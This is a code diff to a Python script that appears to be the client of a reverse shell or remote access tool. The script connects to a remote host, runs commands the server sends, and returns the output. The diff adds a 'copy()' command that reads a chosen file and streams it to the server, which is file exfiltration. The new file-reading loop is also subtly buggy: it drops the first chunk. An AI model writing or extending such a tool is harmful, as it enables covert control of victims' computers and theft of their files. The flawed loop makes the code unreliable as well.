@@ -10,7 +10,7 @@ server.connect((host, port))
 msg = server.recv(1024)
 print(msg.decode('utf-8') + "\n")
 
-emptyResponseCommands = ["cls"]
+emptyResponseCommands = ["cls", "exit"]
 
 while True:
     cwd = os.getcwd().encode("utf-8")
@@ -23,8 +23,6 @@ while True:
         print("\nConnection Terminated.")
         break
     else:
-        print(command)
-
         if command == "cd .." or command == "cd..":
             curDir = cwd.decode("utf-8").split("\\")
             os.chdir("\\".join(curDir[:len(curDir)-1]))
@@ -36,6 +34,14 @@ while True:
             server.send(b"COMMAND EXCPETION.")
         elif command == "RESPOND NULL":
             continue
+        elif "copy()" in command:
+            fileName = command.split(".copy()")
+            fileAlias = open(fileName[0], "rb")
+            binaryData = fileAlias.read(1024)
+            while binaryData:
+                binaryData = fileAlias.read(1024)
+                server.send(binaryData)
+            server.send(b"EOF")
         elif command in emptyResponseCommands:
             server.send(b"This command is currently not supported.\n")
         else:
